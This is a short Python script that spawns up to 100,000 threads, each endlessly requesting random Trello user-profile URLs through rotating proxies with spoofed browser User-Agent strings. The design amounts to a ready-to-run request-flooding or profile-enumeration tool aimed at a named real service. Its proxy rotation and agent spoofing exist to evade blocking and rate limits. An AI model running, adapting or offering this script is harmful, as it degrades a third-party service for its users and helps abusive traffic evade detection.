import requests
import threading
import random
import time
import string

# Function to generate a random user ID
def generate_user_id():
    return ''.join(random.choices(string.digits, k=8))

# List of User-Agent strings
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
]

# Function to read proxies from the file
def load_proxies(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines() if line.strip()]

# Function to perform the request
def send_requests(proxies):
    while True:
        user_id = generate_user_id()
        url = f"https://trello.com/u/user{user_id}"
        headers = {'User-Agent': random.choice(user_agents)}

        # Randomly select a proxy
        proxy = random.choice(proxies)
        proxies_dict = {
            'http': proxy,
            'https': proxy,
        }

        try:
            response = requests.get(url, headers=headers, proxies=proxies_dict)
            print(f"Requested {url} through {proxy} - Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

# Function to start threads
def start_threads(thread_count, proxies):
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_requests, args=(proxies,))
        thread.daemon = True  # Allows program to exit even if threads are running
        thread.start()
        threads.append(thread)
        time.sleep(0.1)  # Wait time between starting threads

    for thread in threads:
        thread.join()  # Wait for all threads to finish (will never finish due to while True)

if __name__ == "__main__":
    number_of_threads = 100000  # You can adjust this number based on your needs
    proxies = load_proxies('proxies.txt')  # Load proxies from the file
    start_threads(number_of_threads, proxies)
